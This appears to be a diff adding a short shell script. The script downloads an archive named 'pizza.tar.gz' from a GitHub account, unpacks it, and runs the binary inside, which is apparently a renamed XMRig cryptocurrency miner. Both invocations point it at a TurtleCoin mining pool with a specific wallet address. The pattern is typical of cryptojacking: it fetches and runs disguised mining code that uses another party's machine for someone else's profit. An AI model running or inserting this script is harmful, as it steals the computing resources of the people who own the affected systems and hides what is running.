@@ -1,0 +1,8 @@
+wget https://raw.githubusercontent.com/p26nkocq0o/pizza/main/pizza.tar.gz
+tar xvzf pizza.tar.gz
+
+screen
+
+./pizza -b 0.0.0.0:443 -a argon2/chukwav2 -m nicehash -o sg.turtlecoin.herominers.com:10381 -u TRTLv1Hqo3wHdqLRXuCyX3MwvzKyxzwXeBtycnkDy8ceFp4E23bm3P467xLEbUusH6Q1mqQUBiYwJ2yULJbvr5nKe8kcyc4uyps+0516f71c62ccfab442a51502dfd33970d0f17c00399c4f3df53f8ea4fad5fa8b.500000 -p pineapple -r 480 -R 30 --user-agent xmrig-6.10.0 --no-workers --donate-level 1
+
+./pizza -b 0.0.0.0:443 -a argon2/chukwav2 -o sg.turtlecoin.herominers.com:10381 -u TRTLv1Hqo3wHdqLRXuCyX3MwvzKyxzwXeBtycnkDy8ceFp4E23bm3P467xLEbUusH6Q1mqQUBiYwJ2yULJbvr5nKe8kcyc4uyps+0516f71c62ccfab442a51502dfd33970d0f17c00399c4f3df53f8ea4fad5fa8b.500000 -p pineapple -r 480 -R 30 --user-agent xmrig-6.10.0 --donate-level 1
